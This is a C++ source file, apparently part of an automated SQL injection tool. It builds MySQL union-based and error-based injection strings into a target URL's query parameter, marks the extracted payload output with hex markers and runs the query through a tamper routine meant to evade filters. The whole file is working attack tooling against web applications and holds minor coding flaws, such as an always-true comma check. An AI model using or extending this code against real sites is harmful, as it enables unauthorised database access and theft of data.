//
// Created by zerte on 5/3/2020.
//

#include "Injection.h"
#include <utils/Utils.h>
#include <Poco/String.h>
#include <injection/mysql/Queries.h>
#include <injection/mysql/Union.h>
#include <injection/mysql/Error.h>

#include <injection/tamper/Tamper.h>

Poco::URI Injection::BuildInjectionQuery(Poco::URI uri, int param, InjectionType iT, DBType dT, int vec, int mod, std::string payload, int andor, int uc, int ui) {
    std::string vector;
    std::pair<std::string, std::string> modulator;
    std::string hexed("58444756");
    Poco::URI u(uri);

    auto queryParams = u.getQueryParameters();
    std::string ting;
    if (!queryParams.empty())
        switch (dT) {
            case MYSQL:
                switch (iT) {
                    case IUNI:
                        vector = Injection::MySQL::Union::_vectors[vec];
                        modulator = Injection::MySQL::_modulators[mod];
                        Poco::replaceInPlace(modulator.first, "%s", Utils::gen_random(4).c_str());
                        Poco::replaceInPlace(modulator.second, "%s", Utils::gen_random(4).c_str());
                        Poco::replaceInPlace(modulator.first, "%d", "4914");
                        Poco::replaceInPlace(modulator.second, "%d", "4914");
                        for (int i=0; i < uc; i++) {
                            if (i == ui) {
                                ting += Utils::format("CONCAT(0x%s,(%s),0x%s)", "58444756", payload.c_str(), "56474458", modulator.second.c_str());
                            } else {
                                ting += Utils::format("%d", i);
                            }

                            if (i < uc) {
                                ting += ",";
                            }
                        }
                        ting = Utils::format(vector.c_str(), modulator.first.c_str(), ting.c_str(), modulator.second.c_str());
                        Tamper::TamperQuery(ting);
                        queryParams[param].second = queryParams[param].second + ting;
                        break;
                    case IERR:
                        vector = Injection::MySQL::Error::_vectors[vec];
                        modulator = Injection::MySQL::_modulators[mod];
                        Poco::replaceInPlace(modulator.first, "%s", Utils::gen_random(4).c_str());
                        Poco::replaceInPlace(modulator.second, "%s", Utils::gen_random(4).c_str());
                        Poco::replaceInPlace(modulator.first, "%d", "4914");
                        Poco::replaceInPlace(modulator.second, "%d", "4914");
                        if (Injection::MySQL::Error::_vectors[vec].find("PROCEDURE") != std::string::npos) {
                            ting = Utils::format(vector.c_str(), modulator.first.c_str(), " ",
                                                 "58444756", payload.c_str(), "56474458", modulator.second.c_str());
                        } else {
                            ting = Utils::format(vector.c_str(), modulator.first.c_str(), (andor == 0 ? "AND" : "OR"),
                                                 "58444756", payload.c_str(), "56474458", modulator.second.c_str());
                        }
                        Tamper::TamperQuery(ting);
                        queryParams[param].second = queryParams[param].second + ting;
                        break;
                    case IBLI:
                        break;
                }
            case ORACLE:
            case POSTGRES:
            case MSSQL:
                break;
        }

    uri.setQueryParameters(queryParams);
    return uri;
}

int Injection::CountPossibleInjections() {
    int i = 0;
    i += MySQL::Error::_vectors.size() * MySQL::_modulators.size();
    return i;
}
